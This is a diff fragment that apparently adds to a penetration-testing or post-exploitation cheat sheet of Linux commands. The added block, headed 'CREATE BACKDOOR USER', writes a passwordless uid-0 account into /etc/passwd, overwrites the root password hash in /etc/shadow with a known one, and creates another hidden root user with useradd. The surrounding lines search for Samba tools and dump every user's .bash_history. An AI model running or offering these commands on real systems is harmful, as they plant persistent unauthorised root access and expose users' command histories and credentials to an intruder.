@@ -507,7 +507,12 @@ find / -name smbclient
 find / -name "samba.d"
 
 
-
+CREATE BACKDOOR USER
+echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd
+sed 's/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./' /etc/shadow > /etc/s2; cat /etc/s2 > /etc/shadow; rm /etc/s2
+	--add password for backdoor user; passwd in example is 'kali'
+useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd pass` rootuser
+	--add root user to host
 
 
 find -name ".bash_history" -exec cat {} \;
